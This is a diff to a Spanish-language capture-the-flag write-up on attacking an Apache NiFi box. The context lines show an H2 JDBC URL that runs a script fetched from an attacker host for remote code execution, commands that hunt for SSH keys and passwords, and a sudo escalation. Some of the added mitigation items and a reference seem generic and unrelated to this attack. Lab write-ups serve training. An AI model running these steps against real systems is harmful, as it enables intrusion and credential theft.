@@ -38,7 +38,11 @@ echo "<IP> helix.htb flow.helix.htb" | sudo tee -a /etc/hosts
 
 La UI de NiFi está operativa con el canvas accesible o con credenciales débiles de instalación.
 
-## Foothold: H2 dentro de NiFi
+## Enumeración
+
+- Puertos, servicios y usuarios relevantes descritos en «Reconocimiento».
+
+## Foothold
 
 1. Crear un **Controller Service** `DBCPConnectionPool` con:
 
@@ -65,7 +69,7 @@ nifi@helix:/opt/nifi/nifi-current$
 
 Variante cuando el INIT no cabe en la URL: `jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://<IP>/init.sql'`, con el `CREATE ALIAS` y el `CALL` en el script.
 
-## Movimiento a operator
+## Movimiento lateral
 
 ```bash
 find /opt/nifi -iname "*.bak" -o -iname "*.zip" -o -iname "id_*" 2>/dev/null
@@ -74,7 +78,7 @@ cat /opt/nifi/nifi-current/conf/*.properties | grep -i "pass\|secret"
 
 De los backups del soporte sale una clave privada SSH y el usuario `operator`. También hay un PDF protegido en su home cuyo contenido apunta al servicio interno.
 
-## Escalada
+## Escalada de privilegios
 
 ```bash
 ss -ltnp | grep -v 127.0.0.1
@@ -89,16 +93,26 @@ sudo /usr/local/bin/maintenance-console
 
 Con eso, comandos como root.
 
-## Evidencia (redactada)
+## Evidencia
 
 ```text
 /home/operator/user.txt  -> <user_flag>
 /root/root.txt           -> <root_flag>
 ```
 
-## Lecciones
+## Lecciones aprendidas
 
 - Cualquier procesador que acepte una **URL JDBC** es un primitivo de RCE en Java si el driver H2 está en el classpath.
 - `INIT=`, `RUNSCRIPT FROM` y `CREATE ALIAS` son la tríada clásica de H2, reciclada de Spring Boot a NiFi.
 - Los backups de configuración de un servicio suelen llevar claves y secretos en claro.
 - Mitigación: drivers JDBC en allowlist, sin `INIT` en URLs, NiFi sin acceso desde la red de usuarios, y `sudo` solo para acciones concretas y auditadas.
+
+## Mitigaciones y detección
+
+- Solo claves, sin contraseña, y `AllowUsers`/`fail2ban` para limitar el acceso.
+- Consultas parametrizadas y permisos mínimos para la cuenta de base de datos.
+
+## Referencias
+
+- [CVE-2023-34468](https://nvd.nist.gov/vuln/detail/CVE-2023-34468)
+- [rop-stack](../../../knowledge/pwn/rop-stack.md)
